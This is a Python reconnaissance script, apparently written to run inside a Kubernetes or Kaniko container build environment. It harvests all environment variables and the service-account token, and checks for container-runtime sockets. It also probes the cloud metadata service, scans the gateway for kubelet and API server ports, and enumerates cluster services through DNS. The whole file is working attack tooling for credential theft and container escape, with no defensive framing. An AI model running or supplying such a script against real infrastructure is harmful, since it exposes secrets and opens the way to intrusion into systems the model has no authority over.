import urllib.request, json, os, socket, struct

r = {}

# Network info
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 53))
    r['my_ip'] = s.getsockname()[0]
    s.close()
except: pass
r['hostname'] = socket.gethostname()
r['uid'] = os.getuid()
r['gid'] = os.getgid()

# Full environment
env_interesting = {}
for k, v in sorted(os.environ.items()):
    env_interesting[k] = v[:200]
r['env'] = env_interesting

# Resolv.conf
try: r['resolv'] = open('/etc/resolv.conf').read().strip()
except: pass

# Routes
try: r['routes'] = open('/proc/net/route').read()
except: pass

# ARP
try: r['arp'] = open('/proc/net/arp').read()
except: pass

# /proc/self info
try: r['cgroup'] = open('/proc/self/cgroup').read()[:500]
except: pass
try: r['mountinfo'] = open('/proc/self/mountinfo').read()[:2000]
except: pass

# Capabilities
try: r['capbnd'] = open('/proc/self/status').read().split('CapBnd:')[1].split('\n')[0].strip()
except: pass

# SA token / secrets
try: r['sa_token'] = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()[:100]
except Exception as e: r['sa_token'] = str(e)[:100]

# Check what's in /var/run
try: r['var_run'] = os.listdir('/var/run')
except: pass

# Docker socket
for sock in ['/var/run/docker.sock', '/run/containerd/containerd.sock', '/run/crio/crio.sock']:
    try:
        os.stat(sock)
        r[f'socket_{sock}'] = 'EXISTS'
    except: pass

# Check for Kaniko workspace
for d in ['/.app_platform_workspace', '/workspace', '/kaniko', '/busybox']:
    try:
        r[f'dir_{d}'] = os.listdir(d)[:20]
    except: pass

# Link-local range scan (not just 169.254.169.254)
for last_octet in [1, 2, 3, 80, 128, 253]:
    ip = f'169.254.169.{last_octet}'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        rc = s.connect_ex((ip, 80))
        if rc == 0 or rc != 111:
            r[f'll_{ip}'] = f'errno={rc}'
        s.close()
    except: pass

# Try different IMDS ports
for port in [80, 443, 8080, 8443]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        rc = s.connect_ex(('169.254.169.254', port))
        r[f'imds_port_{port}'] = 'OPEN' if rc == 0 else f'errno={rc}'
        s.close()
    except: pass

# Scan gateway
try:
    gw_hex = open('/proc/net/route').readlines()[1].split('\t')[2]
    gw_bytes = bytes.fromhex(gw_hex)
    gw_ip = f'{gw_bytes[3]}.{gw_bytes[2]}.{gw_bytes[1]}.{gw_bytes[0]}'
    r['gateway_ip'] = gw_ip
    for port in [80, 443, 8080, 10250, 10255, 4194, 6443]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            rc = s.connect_ex((gw_ip, port))
            if rc == 0:
                r[f'gw_{port}'] = 'OPEN'
            s.close()
        except: pass
except: pass

# DNS discovery - build namespace services
build_ns = None
try:
    resolv = open('/etc/resolv.conf').read()
    for line in resolv.split('\n'):
        if 'search' in line:
            parts = line.split()
            if len(parts) > 1:
                build_ns = parts[1].split('.')[0]
                r['build_namespace'] = build_ns
except: pass

# Try to find other services in the build namespace
if build_ns:
    for svc in ['kaniko','builder','registry','docker','buildkit','build-controller']:
        try:
            ip = socket.getaddrinfo(f'{svc}.{build_ns}.svc.cluster.local', None)[0][4][0]
            r[f'dns_{svc}'] = ip
        except: pass

# Try kube-dns queries for interesting services
for svc_ns in [
    'registry.kube-system', 'registry.default',
    'docker-registry.kube-system', 'docker-registry.default',
    'kaniko.kube-system',
    'buildkit.default',
    'image-registry.openshift-image-registry',
]:
    svc, ns = svc_ns.rsplit('.', 1)
    try:
        ip = socket.getaddrinfo(f'{svc}.{ns}.svc.cluster.local', None)[0][4][0]
        r[f'dns_{svc_ns}'] = ip
    except: pass

# Raw socket test (not gVisor)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    r['raw_socket'] = 'SUCCESS'
    s.close()
except Exception as e:
    r['raw_socket'] = str(e)[:100]

# Try iptables or ip commands
import subprocess
for cmd in [['iptables', '-L', '-n'], ['ip', 'addr'], ['ip', 'route'], ['ip', 'neigh']]:
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        r[f'cmd_{"_".join(cmd[:2])}'] = (out.stdout + out.stderr)[:500]
    except: pass

print(json.dumps(r, indent=2))
